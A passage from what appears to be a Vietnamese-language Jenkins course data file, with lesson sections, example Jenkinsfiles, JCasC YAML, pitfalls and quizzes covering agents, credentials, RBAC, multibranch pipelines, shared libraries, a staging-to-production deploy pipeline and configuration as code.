      "Agent cố định dễ dùng nhưng lệch cấu hình theo thời gian; agent Docker và Kubernetes cho môi trường sạch mỗi build.",
      "`agent { docker { image ... } }` cần plugin Docker Pipeline và máy có Docker.",
      "Pod Kubernetes có container `jnlp` cộng container công cụ; dùng `container()` hoặc `defaultContainer`.",
      "Trong Kubernetes, build image bằng công cụ không cần daemon thay vì mount Docker socket."
    ],
    pitfalls: [
      "Mount `/var/run/docker.sock` vào pod build, ai sửa được Jenkinsfile là có root trên node.",
      "Container công cụ thiếu `command: [cat]`, container thoát ngay và bước `container()` báo lỗi.",
      "Không đặt `resources.requests` cho pod build, nhiều build dồn lên một node và cùng chậm."
    ],
    quiz: [
      {
        q: "Trong pod agent Kubernetes, container `jnlp` dùng để làm gì?",
        options: ["Chạy database cho test", "Giữ kết nối giữa agent và controller", "Lưu cache npm", "Build image Docker"],
        answer: 1,
        explain: "Container `jnlp` chạy tiến trình agent kết nối về controller. Các công cụ build nằm trong container khác do bạn khai báo."
      },
      {
        q: "Vì sao container công cụ trong pod thường có `command: [cat]` và `tty: true`?",
        options: ["Để in log ra màn hình", "Để giữ container chạy chờ Jenkins gửi lệnh vào", "Để bật chế độ debug", "Vì Kubernetes bắt buộc"],
        answer: 1,
        explain: "Không có tiến trình chạy lâu, container sẽ thoát ngay. `cat` với tty giữ nó sống để các bước `sh` chạy bên trong."
      },
      {
        q: "Cách nào an toàn hơn để build image trong pod Kubernetes?",
        options: ["Mount Docker socket của node vào pod", "Chạy mọi container ở chế độ privileged", "Dùng công cụ build không cần daemon như Buildah hoặc BuildKit rootless", "Build trên controller"],
        answer: 2,
        explain: "Mount socket hay privileged trao quyền root trên node. Build trên controller vi phạm nguyên tắc cách ly controller."
      }
    ]
  },
  "p08.m6.t5": {
    videos: [
      { id: "yfjtMIDgmfs", title: "The Correct Way to Handle Credentials in a Jenkins Pipeline", channel: "CloudBeesTV", lang: "en", minutes: 10, embed: true },
      { id: "LJru4bq9yVY", title: "Jenkins Role Based Access Control (RBAC) #jenkins  #accesscontrol", channel: "DevOps - Free Tutorials", lang: "en", minutes: 7, embed: true }
    ],
    sections: [
      {
        h: "Các loại credential và phạm vi",
        p: [
          "Plugin Credentials lưu secret đã mã hoá trong `JENKINS_HOME`. Loại thường dùng: Username with password (tài khoản registry, Nexus), Secret text (token API, webhook Telegram/Slack), Secret file (kubeconfig, file `.env`), SSH Username with private key (deploy qua SSH, checkout Git), Certificate.",
          "Mỗi credential có scope. Global: job dùng được. System: chỉ Jenkins dùng cho việc của nó (kết nối agent SSH, quét repo), job không đọc được. Nên tạo credential ở cấp folder của team thay vì Global, để team khác không dùng được secret production của bạn."
        ]
      },
      {
        h: "Dùng credential trong pipeline",
        p: [
          "`withCredentials` chỉ đưa secret vào biến môi trường trong phạm vi khối, và che giá trị bằng `****` trong log. Việc che log chỉ khớp đúng chuỗi secret: nếu script in secret đã bị biến đổi (base64, tách ký tự, in ra file rồi `cat`), log vẫn lộ. Luôn dùng nháy đơn để shell đọc biến; với nháy kép, Groovy chèn secret vào chuỗi lệnh và Jenkins sẽ cảnh báo trong log về việc truyền secret qua Groovy String interpolation."
        ],
        code: {
          lang: "groovy",
          file: "Jenkinsfile",
          src: `stage('Deploy') {
  steps {
    withCredentials([
      file(credentialsId: 'kubeconfig-staging', variable: 'KUBECONFIG'),
      string(credentialsId: 'telegram-bot-token', variable: 'TG_TOKEN')
    ]) {
      sh 'kubectl -n shop set image deploy/order-api app="$IMAGE"'
      sh 'curl -fsS -X POST "https://api.telegram.org/bot$TG_TOKEN/sendMessage" -d chat_id=-100123 -d text="Đã deploy $IMAGE"'
    }
    // SSH: cần plugin SSH Agent
    sshagent(credentials: ['deploy-ssh']) {
      sh 'ssh deploy@10.0.1.20 "docker compose -f /srv/app/compose.yaml pull && docker compose -f /srv/app/compose.yaml up -d"'
    }
  }
}`
        }
      },
      {
        h: "Đăng nhập và phân quyền",
        p: [
          "Security Realm là nơi xác thực người dùng: cơ sở dữ liệu người dùng của Jenkins, LDAP/Active Directory (phổ biến trong doanh nghiệp), hoặc SSO qua SAML/OpenID Connect. Authorization Strategy quyết định ai được làm gì. Plugin Matrix Authorization Strategy cho phân quyền theo từng quyền (Job/Build, Job/Configure, Credentials/View...) ở cấp toàn hệ thống, folder hoặc job. Plugin Role-based Authorization Strategy gom quyền thành role, gán theo nhóm LDAP và theo mẫu tên job.",
          "Nguyên tắc: developer được Build và Read job của team, chỉ một nhóm nhỏ có Configure, chỉ admin có Overall/Administer. Không bao giờ bật \"Anyone can do anything\", kể cả trong mạng nội bộ."
        ]
      },
      {
        h: "Giữ Jenkins an toàn",
        p: [
          "Phần lớn lỗ hổng Jenkins nằm ở plugin; trang Manage Jenkins hiển thị cảnh báo khi plugin đang cài có lỗ hổng đã công bố. Theo dõi Jenkins Security Advisories và cập nhật định kỳ. Bài học thật: CVE-2024-23897 (1/2024) cho phép đọc file tuỳ ý trên controller qua Jenkins CLI, kể cả khoá giải mã secret; nhiều máy chủ Jenkins để lộ ra Internet đã bị khai thác. Đừng đưa Jenkins ra Internet công khai nếu không bắt buộc; đặt sau VPN hoặc SSO."
        ]
      }
    ],
    summary: [
      "Chọn đúng loại credential; scope System chỉ cho Jenkins dùng, credential của team nên đặt ở folder.",
      "`withCredentials` giới hạn phạm vi secret và che log, nhưng không che được secret đã bị biến đổi.",
      "Xác thực qua LDAP/SSO, phân quyền bằng Matrix hoặc Role-based theo nguyên tắc tối thiểu.",
      "Cập nhật plugin và core thường xuyên, không để Jenkins lộ ra Internet."
    ],
    pitfalls: [
      "Tạo mọi credential ở Global, job của team nào cũng đọc được secret production.",
      "`sh \"curl -H 'Authorization: $TOKEN'\"` với nháy kép, token nằm trong chuỗi lệnh.",
      "Cho developer quyền Job/Configure trên job deploy production, ai cũng sửa được bước deploy."
    ],
    quiz: [
      {
        q: "Credential có scope System dùng cho mục đích gì?",
        options: ["Mọi job đều dùng được", "Chỉ Jenkins dùng cho việc hệ thống như kết nối agent, job không đọc được", "Chỉ dùng trong Freestyle job", "Lưu ngoài Jenkins, trong Vault"],
        answer: 1,
        explain: "System scope dành cho chính Jenkins (kết nối agent SSH, quét repo). Job cần credential Global hoặc cấp folder."
      },
      {
        q: "`withCredentials` che secret trong log như thế nào?",
        options: ["Che mọi dạng biến đổi của secret", "Thay đúng chuỗi secret bằng ****, không che bản đã biến đổi như base64", "Tắt toàn bộ log của khối", "Mã hoá log bằng khoá riêng"],
        answer: 1,
        explain: "Che log dựa trên khớp chuỗi. Secret bị mã hoá base64 hay tách ký tự vẫn lộ, nên đừng in secret ra log dưới bất kỳ dạng nào."
      },
      {
        q: "Plugin nào cho phép gom quyền thành role và gán theo nhóm LDAP?",
        options: ["Role-based Authorization Strategy", "Pipeline Graph View", "Workspace Cleanup", "Timestamper"],
        answer: 0,
        explain: "Role-based Authorization Strategy định nghĩa role và gán cho người dùng/nhóm. Các plugin còn lại phục vụ hiển thị pipeline, dọn workspace và thêm thời gian vào log."
      }
    ]
  },
  "p08.m6.t6": {
    videos: [
      { id: "aDmeeVDrp0o", title: "How to Create a GitHub Branch Source Multibranch Pipeline in Jenkins", channel: "CloudBeesTV", lang: "en", minutes: 27, embed: true },
      { id: "y4XGFluzPHY", title: "How to Create a GitLab Multibranch Pipeline in Jenkins", channel: "CloudBeesTV", lang: "en", minutes: 21, embed: true }
    ],
    sections: [
      {
        h: "Multibranch pipeline làm gì",
        p: [
          "Multibranch Pipeline gắn với một repo. Mỗi lần quét (branch indexing), Jenkins tìm các nhánh, pull/merge request và tag có Jenkinsfile, tạo job con cho từng cái, và xoá job của nhánh đã bị xoá theo cấu hình Orphaned Item Strategy. Mỗi nhánh là một job riêng, có lịch sử build riêng.",
          "Để nói chuyện với nền tảng Git, cài plugin nguồn tương ứng: GitHub Branch Source, GitLab Branch Source hoặc Bitbucket Branch Source. Các plugin này hiểu PR/MR, báo trạng thái build ngược về và nhận webhook. Nếu chỉ dùng plugin Git thuần, Jenkins vẫn thấy nhánh nhưng không hiểu PR."
        ]
      },
      {
        h: "Webhook thay vì poll",
        p: [
          "Poll SCM kiểm tra repo theo lịch, vừa chậm vừa tốn tải cho cả Jenkins lẫn máy chủ Git. Webhook để nền tảng Git gọi Jenkins ngay khi có push hoặc PR. Đường dẫn webhook tuỳ plugin, ví dụ `https://jenkins.company.vn/github-webhook/` cho GitHub; với GitLab Branch Source, plugin có thể tự đăng ký webhook cho repo khi được cấu hình quyền. Máy chủ Git phải gọi tới được Jenkins; nếu Jenkins nằm trong mạng nội bộ còn Git ở cloud, cần reverse proxy hoặc giải pháp chuyển tiếp webhook.",
          "Vẫn nên đặt quét định kỳ thưa (ví dụ mỗi ngày) như lưới an toàn khi webhook bị lỡ."
        ]
      },
      {
        h: "Build PR và báo trạng thái",
        p: [
          "Plugin nguồn báo kết quả build lên PR dưới dạng commit status/check. Kết hợp với branch protection (bắt buộc check `continuous-integration/jenkins/pr-merge` hoặc tên tương ứng phải xanh) để không ai merge code đỏ. Với PR, chọn chiến lược build \"merge với nhánh đích\" để test đúng code sau khi merge.",
          "Trong Jenkinsfile, tách hành vi cho PR và nhánh chính: PR chỉ chạy lint, test, build thử; nhánh `main` mới push image và deploy. Dùng `when { changeRequest() }` cho PR và `when { branch 'main' }` cho nhánh chính."
        ]
      },
      {
        h: "PR từ fork: đừng để lộ secret",
        p: [
          "Với repo có người ngoài gửi PR từ fork, nguy hiểm lớn nhất là PR sửa Jenkinsfile để in credential ra. GitHub Branch Source có tuỳ chọn Trust cho \"Discover pull requests from forks\": Nobody, Collaborators, From users with Admin or Write permission (mặc định), Everyone. Với PR từ người không được tin cậy, Jenkins dùng Jenkinsfile của nhánh đích thay vì Jenkinsfile trong PR, nên sửa pipeline trong PR không có tác dụng. Đừng chọn Everyone cho repo có credential."
        ]
      }
    ],
    summary: [
      "Multibranch tự tạo và dọn job theo nhánh, PR, tag có Jenkinsfile.",
      "Dùng plugin nguồn GitHub/GitLab/Bitbucket để hiểu PR và báo trạng thái.",
      "Webhook cho build tức thì; quét định kỳ thưa làm lưới an toàn.",
      "PR chỉ test; `main` mới deploy. Không tin Jenkinsfile từ fork lạ."
    ],
    pitfalls: [
      "Để poll SCM mỗi phút cho hàng trăm repo, máy chủ Git bị quá tải.",
      "Deploy trong stage không có `when`, mọi PR đều deploy lên staging.",
      "Đặt Trust là Everyone cho repo công khai, PR từ fork đọc được credential."
    ],
    quiz: [
      {
        q: "Vì sao nên dùng webhook thay cho Poll SCM?",
        options: ["Webhook bảo mật hơn vì không cần mạng", "Build bắt đầu ngay khi có push và giảm tải cho máy chủ Git", "Poll SCM không hoạt động với Git", "Webhook không cần Jenkinsfile"],
        answer: 1,
        explain: "Webhook đẩy sự kiện ngay lập tức; poll phải chờ tới lượt quét và liên tục hỏi máy chủ Git."
      },
      {
        q: "Với PR từ fork của người không được tin cậy, GitHub Branch Source dùng Jenkinsfile nào?",
        options: ["Jenkinsfile trong PR", "Jenkinsfile của nhánh đích", "Không build PR đó", "Jenkinsfile mặc định của Jenkins"],
        answer: 1,
        explain: "Jenkins dùng Jenkinsfile của nhánh đích để PR không sửa được pipeline nhằm lấy secret."
      },
      {
        q: "Điều kiện nào dùng để chạy stage chỉ cho build của pull request?",
        options: ["`when { branch 'main' }`", "`when { buildingTag() }`", "`when { changeRequest() }`", "`when { changelog '.*' }`"],
        answer: 2,
        explain: "`changeRequest()` đúng khi build là PR/MR. `branch` lọc theo tên nhánh, `buildingTag` cho tag, `changelog` theo nội dung commit."
      }
    ]
  },
  "p08.m6.t7": {
    videos: [
      { id: "Wj-weFEsTb0", title: "Getting Started With Shared Libraries in Jenkins", channel: "CloudBeesTV", lang: "en", minutes: 23, embed: true }
    ],
    sections: [
      {
        h: "Cấu trúc một shared library",
        p: [
          "Khi công ty có hàng chục service, copy Jenkinsfile giữa các repo sẽ nhanh chóng lệch nhau. Shared library gom phần dùng chung vào một repo riêng với cấu trúc cố định."
        ],
        list: [
          "`vars/`: mỗi file `ten.groovy` trở thành một bước gọi được trong Jenkinsfile (`ten(...)`), thường có hàm `call`. File `ten.txt` cạnh đó là tài liệu hiển thị trong trang Pipeline Syntax.",
          "`src/`: class Groovy theo package (ví dụ `src/vn/company/ci/Docker.groovy`), dùng cho logic phức tạp hơn.",
          "`resources/`: file tĩnh (template, script shell, cấu hình), đọc bằng `libraryResource('path')`."
        ]
      },
      {
        h: "Trusted và untrusted",
        p: [
          "Library khai báo ở Manage Jenkins → System → Global Trusted Pipeline Libraries là trusted: chạy ngoài sandbox, gọi được mọi API Java và Jenkins. Tài liệu Jenkins cảnh báo: ai push được vào repo của library đó có toàn quyền trên Jenkins. Hãy bảo vệ repo library như code production: branch protection, review bắt buộc, giới hạn người được merge. Library khai báo ở cấp folder luôn là untrusted và chạy trong sandbox.",
          "Có thể đánh dấu library \"Load implicitly\" để mọi pipeline tự nạp mà không cần `@Library`, nhưng khi đó người đọc Jenkinsfile khó biết bước lạ đến từ đâu. Nạp rõ ràng dễ bảo trì hơn."
        ]
      },
      {
        h: "Ví dụ: một bước build chuẩn cho mọi service Node",
        p: [
          "Library định nghĩa một bước nhận tham số và dựng cả pipeline. Mỗi service chỉ cần vài dòng. Pin phiên bản library bằng tag để thay đổi trong library không làm vỡ mọi pipeline cùng lúc; cấu hình \"Allow default version to be overridden\" cho phép service chọn phiên bản."
        ],
        code: {
          lang: "groovy",
          file: "vars/nodeService.groovy",
          src: `def call(Map cfg) {
  def registry = cfg.registry ?: 'harbor.company.vn'
  pipeline {
    agent { label 'docker' }
    options { timeout(time: 30, unit: 'MINUTES'); buildDiscarder(logRotator(numToKeepStr: '30')) }
    stages {
      stage('Test') {
        agent { docker { image "node:\${cfg.node ?: '24'}-alpine"; reuseNode true } }
        steps { sh 'npm ci && npm test' }
      }
      stage('Image') {
        when { branch 'main' }
        steps {
          script { env.IMAGE = "\${registry}/\${cfg.app}:\${env.GIT_COMMIT.take(12)}" }
          dockerBuildPush(image: env.IMAGE, credentialsId: 'harbor-robot')   // bước khác trong vars/
        }
      }
    }
  }
}

// Jenkinsfile của service order-api chỉ còn:
// @Library('company-ci@v2.3.0') _
// nodeService(app: 'shop/order-api', node: '24')`
        }
      },
      {
        h: "Kiểm thử và phát hành library",
        p: [
          "Thử thay đổi library trước khi gắn tag: trong một Jenkinsfile thử nghiệm, nạp nhánh đang sửa bằng `@Library('company-ci@feature-x') _`; với library trên GitHub có thể dùng `@Library('company-ci@pull/123/head') _`. Với library untrusted, nút Replay cho sửa trực tiếp file library trong một lần chạy; Replay không hỗ trợ trusted library. Viết unit test cho `vars/` và `src/` bằng JenkinsPipelineUnit để bắt lỗi logic mà không cần Jenkins thật.",
          "Theo best practice của Jenkins: không ghi đè bước có sẵn như `sh` hay `timeout`, tránh file biến toàn cục khổng lồ, và giữ library nhỏ vì nó được checkout cho mỗi lần chạy."
        ]
      }
    ],
    summary: [
      "`vars/` chứa bước dùng chung, `src/` chứa class, `resources/` chứa file tĩnh.",
      "Global trusted library chạy ngoài sandbox: bảo vệ repo của nó như production.",
      "Pin library theo tag; thử nhánh hoặc PR của library trước khi phát hành.",
      "Không ghi đè bước có sẵn, giữ library gọn."
    ],
    pitfalls: [
      "Cho mọi developer push thẳng vào repo trusted library.",
      "Dùng `@Library('company-ci') _` không kèm phiên bản, một commit lỗi ở library làm đỏ mọi pipeline.",
      "Đặt một hàm `sh` trong `vars/sh.groovy`, ghi đè bước chuẩn và gây lỗi khó hiểu."
    ],
    quiz: [
      {
        q: "File `vars/deployApp.groovy` trong shared library tạo ra gì?",
        options: ["Một biến môi trường tên deployApp", "Một bước `deployApp(...)` gọi được trong Jenkinsfile", "Một job mới tên deployApp", "Một plugin Jenkins"],
        answer: 1,
        explain: "Mỗi file trong `vars/` trở thành một bước (global variable) gọi được từ pipeline."
      },
      {
        q: "Vì sao repo của Global Trusted Pipeline Library cần được bảo vệ chặt?",
        options: ["Vì nó chạy ngoài sandbox, ai push được vào đó có toàn quyền trên Jenkins", "Vì Jenkins tính phí theo số library", "Vì library không có lịch sử git", "Vì library chạy trên máy developer"],
        answer: 0,
        explain: "Trusted library gọi được mọi API của Jenkins. Tài liệu chính thức cảnh báo người push được vào repo này có quyền không giới hạn."
      },
      {
        q: "Cách an toàn để nạp library trong Jenkinsfile của service là gì?",
        options: ["`@Library('company-ci') _` luôn lấy nhánh mới nhất", "Copy toàn bộ library vào repo service", "`@Library('company-ci@v2.3.0') _` pin theo tag", "Bật Load implicitly cho mọi library"],
        answer: 2,
        explain: "Pin theo tag giúp thay đổi library được phát hành có kiểm soát. Copy làm mất tác dụng dùng chung; nạp ngầm khó truy vết."
      }
    ]
  },
  "p08.m6.t8": {
    videos: [
      { id: "zEnF_BWCk6U", title: "DevOps for Freshers | Bài 30: Jenkins CI/CD (Continuous Delivery) | DevOps cho người mới bắt đầu", channel: "DEVOPSEDU VN", lang: "vi", minutes: 15, embed: true },
      { id: "PKcGy9oPVXg", title: "Build & Push Docker Image using Jenkins Pipeline | Devops Integration Live Example Step By Step", channel: "Java Techie", lang: "en", minutes: 32, embed: true }
    ],
    sections: [
      {
        h: "Bức tranh thường gặp ở công ty",
        p: [
          "Một cấu hình rất phổ biến ở doanh nghiệp Việt Nam: GitLab hoặc Bitbucket tự host, Jenkins trong mạng nội bộ, registry Harbor hoặc Nexus, ứng dụng chạy bằng Docker Compose trên VM hoặc trên Kubernetes. Pipeline dưới đây gom các ý đã học: test trong container, build image một lần theo commit, deploy staging, smoke test, chờ duyệt, deploy production có khoá chống chạy chồng và rollback.",
          "Pipeline dùng thêm plugin Lockable Resources (`lock`), SSH Agent (`sshagent`) và Docker Pipeline."
        ],
        code: {
          lang: "groovy",
          file: "Jenkinsfile",
          src: `pipeline {
  agent none
  options {
    timeout(time: 1, unit: 'HOURS')
    buildDiscarder(logRotator(numToKeepStr: '50'))
    disableConcurrentBuilds()
  }
  environment {
    REGISTRY = 'harbor.company.vn'
    APP      = 'shop/order-api'
  }
  stages {
    stage('Test') {
      agent { docker { image 'node:24-alpine'; label 'docker' } }
      steps { sh 'npm ci && npm run lint && npm test' }
      post { always { junit 'reports/junit.xml' } }
    }
    stage('Build & push image') {
      when { branch 'main'; beforeAgent true }
      agent { label 'docker' }
      steps {
        script { env.IMAGE = "\${env.REGISTRY}/\${env.APP}:\${env.GIT_COMMIT.take(12)}" }
        withCredentials([usernamePassword(credentialsId: 'harbor-robot',
                         usernameVariable: 'REG_USER', passwordVariable: 'REG_PASS')]) {
          sh '''
            echo "$REG_PASS" | docker login "$REGISTRY" -u "$REG_USER" --password-stdin
            docker build -t "$IMAGE" .
            docker push "$IMAGE"
          '''
        }
      }
      post { always { sh 'docker logout "$REGISTRY" || true' } }
    }
    stage('Deploy staging') {
      when { branch 'main'; beforeAgent true }
      agent { label 'deploy' }
      steps {
        lock('order-api-staging') {
          sshagent(credentials: ['deploy-ssh']) {
            sh 'ssh deploy@staging.company.vn "IMAGE=$IMAGE /srv/order-api/deploy.sh"'
          }
          sh 'curl -fsS --retry 10 --retry-delay 3 --retry-all-errors https://staging-api.company.vn/healthz'
        }
      }
    }
    stage('Duyệt production') {
      when { branch 'main'; beforeInput true }
      options { timeout(time: 1, unit: 'DAYS') }
      input {
        message 'Deploy bản này lên production?'
        ok 'Deploy'
        submitter 'release-managers'
        submitterParameter 'APPROVER'
      }
      steps { echo "Duyệt bởi \${env.APPROVER}" }
    }
    stage('Deploy production') {
      when { branch 'main'; beforeAgent true }
      agent { label 'deploy' }
      steps {
        lock('order-api-production') {
          sshagent(credentials: ['deploy-ssh']) {
            sh 'ssh deploy@prod.company.vn "IMAGE=$IMAGE /srv/order-api/deploy.sh"'
          }
          sh 'curl -fsS --retry 10 --retry-delay 3 --retry-all-errors https://api.company.vn/healthz'
        }
      }
      post {
        failure {
          sshagent(credentials: ['deploy-ssh']) {
            sh 'ssh deploy@prod.company.vn "/srv/order-api/deploy.sh rollback"'
          }
        }
      }
    }
  }
  post {
    failure { echo "Báo lỗi: \${env.JOB_NAME} #\${env.BUILD_NUMBER} \${env.BUILD_URL}" }
  }
}`
        }
      },
      {
        h: "Những điểm đáng chú ý",
        list: [
          "Image được build một lần với tag là 12 ký tự đầu của commit; staging và production dùng cùng image (build once, deploy many). Gán `env.IMAGE` trong `script` để các stage sau đọc được.",
          "`agent none` ở cấp pipeline và agent riêng cho từng stage: stage duyệt không giữ executor nào trong lúc chờ người bấm.",
          "`submitter` giới hạn ai được duyệt; `submitterParameter` ghi lại người duyệt để truy vết.",
          "`lock` ngăn hai pipeline khác nhau (ví dụ hai service dùng chung môi trường) cùng deploy vào một nơi; `disableConcurrentBuilds` chỉ chặn trong cùng một job.",
          "Agent label `deploy` đặt trong vùng mạng được phép SSH tới máy chủ; agent build không cần quyền đó.",
          "Smoke test thất bại làm stage FAILURE và `post { failure }` gọi rollback. Script `deploy.sh` trên máy chủ cần lưu image đang chạy trước khi đổi để rollback được."
        ],
        p: [
          "Pipeline có thể gọn hơn bằng shared library, nhưng hãy chắc chắn mình hiểu từng dòng trước khi đóng gói lại."
        ]
      },
      {
        h: "Nếu deploy lên Kubernetes",
        p: [
          "Thay bước SSH bằng Helm với kubeconfig lấy từ credential dạng Secret file. `--rollback-on-failure` (Helm 3 gọi là `--atomic`) chờ tài nguyên sẵn sàng và tự rollback nếu thất bại, nên thường không cần viết bước rollback riêng. Nếu công ty dùng GitOps với Argo CD, Jenkins chỉ cần cập nhật tag image trong repo cấu hình, việc deploy do Argo CD đảm nhận."
        ],
        code: {
          lang: "groovy",
          file: "Jenkinsfile",
          src: `withCredentials([file(credentialsId: 'kubeconfig-prod', variable: 'KUBECONFIG')]) {
  sh '''
    helm upgrade --install order-api ./chart -n shop \\
      --set image.tag="\${IMAGE##*:}" \\
      --rollback-on-failure --timeout 5m
  '''
}`
        }
      }
    ],
    summary: [
      "Test trong container, build image một lần theo commit, dùng lại cho staging và production.",
      "Stage duyệt dùng directive `input` với `agent none` để không giữ executor; giới hạn người duyệt.",
      "`lock` chống deploy chồng giữa các job; smoke test lỗi thì rollback.",
      "Trên Kubernetes dùng Helm `--rollback-on-failure` hoặc để Argo CD deploy theo GitOps."
    ],
    pitfalls: [
      "Build lại image cho production từ cùng commit, bản chạy production khác bản đã test.",
      "Đặt `agent any` ở cấp pipeline rồi `input` bên trong, một executor bị giữ cả ngày chờ duyệt.",
      "Không có `submitter`, ai vào được Jenkins cũng bấm deploy production."
    ],
    quiz: [
      {
        q: "Vì sao pipeline gán `env.IMAGE` theo commit ở stage build và dùng lại ở các stage deploy?",
        options: ["Để production chạy đúng image đã deploy và kiểm tra ở staging", "Để build chạy nhanh hơn", "Vì Docker bắt buộc tag theo commit", "Để không cần registry"],
        answer: 0,
        explain: "Build once, deploy many: cùng một image đi qua staging rồi production, không build lại."
      },
      {
        q: "`lock('order-api-production')` giải quyết vấn đề gì mà `disableConcurrentBuilds()` không giải quyết?",
        options: ["Chặn hai job khác nhau cùng deploy vào một môi trường", "Tăng tốc build", "Tự động rollback", "Mã hoá credential"],
        answer: 0,
        explain: "`disableConcurrentBuilds` chỉ chặn chạy song song trong cùng job; `lock` là khoá dùng chung giữa mọi job."
      },
      {
        q: "Tác dụng của `submitterParameter 'APPROVER'` trong directive `input` là gì?",
        options: ["Chỉ định ai được duyệt", "Ghi tên người đã duyệt vào biến môi trường APPROVER", "Gửi email cho người duyệt", "Đặt thời gian chờ duyệt"],
        answer: 1,
        explain: "`submitter` giới hạn người được duyệt; `submitterParameter` lưu tên người duyệt để ghi log, truy vết."
      }
    ]
  },
  "p08.m6.t9": {
    videos: [
      { id: "ReAqFY4dyic", title: "Mastering Jenkins as Code: A Comprehensive Tutorial with Full Demo | JCasC | Jenkins Configuration", channel: "DevOpsCertification", lang: "en", minutes: 10, embed: true },
      { id: "LCKm3tlQSCA", title: "Create Your Jenkins Job with Code ( Job DSL Plugin)", channel: "The Testing Academy", lang: "en", minutes: 8, embed: true }
    ],
    sections: [
      {
        h: "Dựng Jenkins bằng code",
        p: [
          "Jenkins cấu hình bằng click qua nhiều năm sẽ thành \"hộp đen\" không ai dám động vào. Cách hiện đại: một image Docker chứa sẵn plugin đã pin phiên bản, cộng file YAML của plugin Configuration as Code (JCasC) mô tả toàn bộ cấu hình. Dựng lại Jenkins lúc đó chỉ là build image và chạy container.",
          "`jenkins-plugin-cli` có sẵn trong image chính thức, cài plugin theo danh sách trong file. Ghi rõ phiên bản mỗi plugin (`ten:phien-ban`) để lần build sau không tự nhảy phiên bản."
        ],
        code: {
          lang: "dockerfile",
          file: "Dockerfile",
          src: `FROM jenkins/jenkins:2.568.3-jdk21
# Bỏ trình hướng dẫn cài đặt lần đầu, cấu hình đã có trong JCasC
ENV JAVA_OPTS="-Djenkins.install.runSetupWizard=false"
# Đặt JCasC ngoài JENKINS_HOME: JENKINS_HOME là volume, file copy vào đó chỉ có hiệu lực ở lần tạo volume đầu tiên
ENV CASC_JENKINS_CONFIG=/var/jenkins_casc
COPY --chown=jenkins:jenkins plugins.txt /usr/share/jenkins/ref/plugins.txt
RUN jenkins-plugin-cli --plugin-file /usr/share/jenkins/ref/plugins.txt
COPY --chown=jenkins:jenkins casc/ /var/jenkins_casc/`
        }
      },
      {
        h: "File JCasC",
        p: [
          "Plugin JCasC đọc biến `CASC_JENKINS_CONFIG`, có thể trỏ tới một file, một thư mục (đọc mọi file `.yaml`) hoặc URL. Secret không ghi thẳng trong YAML mà tham chiếu dạng `\${TEN_BIEN}`, lấy từ biến môi trường, file secret của Docker/Kubernetes hoặc Vault. Mẹo: cấu hình thử trên giao diện rồi vào Manage Jenkins → Configuration as Code → View Configuration để xem YAML tương ứng."
        ],
        code: {
          lang: "yaml",
          file: "casc/jenkins.yaml",
          src: `jenkins:
  systemMessage: "Jenkins được cấu hình bằng JCasC, đừng sửa tay trên giao diện"
  numExecutors: 0                 # không build trên built-in node
  securityRealm:
    ldap:
      configurations:
        - server: "ldaps://ldap.company.vn:636"
          rootDN: "dc=company,dc=vn"
          managerDN: "cn=jenkins,ou=svc,dc=company,dc=vn"
          managerPasswordSecret: "\${LDAP_PASSWORD}"
  authorizationStrategy:
    globalMatrix:
      entries:
        - group: { name: "jenkins-admins", permissions: ["Overall/Administer"] }
        - group: { name: "developers", permissions: ["Overall/Read", "Job/Read", "Job/Build"] }
credentials:
  system:
    domainCredentials:
      - credentials:
          - usernamePassword:
              scope: GLOBAL
              id: "harbor-robot"
              username: "robot$ci"
              password: "\${HARBOR_ROBOT_TOKEN}"
unclassified:
  location:
    url: "https://jenkins.company.vn/"`
        }
      },
      {
        h: "Job cũng là code: Job DSL và seed job",
        p: [
          "Plugin Job DSL cho phép khai báo job (kể cả multibranch) bằng script. Một \"seed job\" chạy script đó để tạo và cập nhật mọi job khác. JCasC có khối `jobs:` gọi Job DSL ngay khi Jenkins khởi động. Kết hợp lại, cả cấu hình lẫn danh sách job đều nằm trong git."
        ],
        code: {
          lang: "groovy",
          file: "jobs/order-api.groovy",
          src: `multibranchPipelineJob('shop/order-api') {
  branchSources {
    git {
      id('order-api')
      remote('https://gitlab.company.vn/shop/order-api.git')
      credentialsId('gitlab-ci')
    }
  }
  orphanedItemStrategy { discardOldItems { numToKeep(20) } }
}`
        }
      },
      {
        h: "Vận hành hằng ngày",
        list: [
          "Sao lưu `JENKINS_HOME`, bỏ qua workspace và cache. Phải sao lưu thư mục `secrets/` cùng lúc: mất nó thì không giải mã được credential nào.",
          "Nâng cấp theo dòng LTS: đọc LTS upgrade guide, sao lưu, thử trên một Jenkins staging dựng từ cùng image, rồi mới nâng production. Cập nhật plugin cùng đợt.",
          "Giới hạn lịch sử build bằng `buildDiscarder` và dọn workspace, ổ đĩa đầy là nguyên nhân sự cố Jenkins rất phổ biến.",
          "Giám sát bằng plugin Prometheus metrics (độ dài hàng đợi, executor rảnh, thời gian build) và cảnh báo khi hàng đợi dài bất thường.",
          "Blue Ocean đã bị deprecate từ 7/2026 và không còn nhận bản vá bảo mật; dùng Pipeline Graph View hoặc Pipeline: Stage View thay thế."
        ],
        p: [
          "Mục tiêu: nếu máy chủ Jenkins cháy hôm nay, bạn dựng lại được trong một giờ từ git và bản sao lưu."
        ]
      }
    ],
    summary: [
      "Image Docker có plugin pin phiên bản + JCasC YAML = Jenkins dựng lại được.",
      "Secret trong JCasC tham chiếu qua biến, không ghi thẳng.",
      "Job DSL và seed job đưa danh sách job vào git.",
      "Sao lưu `JENKINS_HOME` kèm `secrets/`, nâng cấp theo LTS có thử trước, bỏ Blue Ocean."
    ],
    pitfalls: [
      "Sao lưu `jobs/` và `config.xml` nhưng quên `secrets/`, khôi phục xong mọi credential vô dụng.",
      "`plugins.txt` không ghi phiên bản, mỗi lần build image lại ra một bộ plugin khác.",
      "Vừa dùng JCasC vừa cho sửa tay trên giao diện, lần khởi động sau cấu hình tay bị ghi đè."
    ],
    quiz: [
      {
        q: "Biến môi trường nào chỉ cho plugin JCasC biết file cấu hình ở đâu?",
        options: ["JENKINS_HOME", "CASC_JENKINS_CONFIG", "JAVA_OPTS", "JENKINS_URL"],
        answer: 1,
        explain: "JCasC đọc `CASC_JENKINS_CONFIG`, trỏ tới file, thư mục hoặc URL chứa YAML."
      },
      {
        q: "Khi sao lưu Jenkins, vì sao phải giữ thư mục `secrets/`?",
        options: ["Vì nó chứa log build", "Vì nó chứa khoá giải mã credential; mất nó thì credential không dùng được", "Vì nó chứa plugin", "Vì nó chứa workspace"],
        answer: 1,
        explain: "Credential được mã hoá bằng khoá trong `secrets/`. Log nằm trong `jobs/`, plugin trong `plugins/`."
      },
      {
        q: "Tình trạng của Blue Ocean hiện nay là gì?",
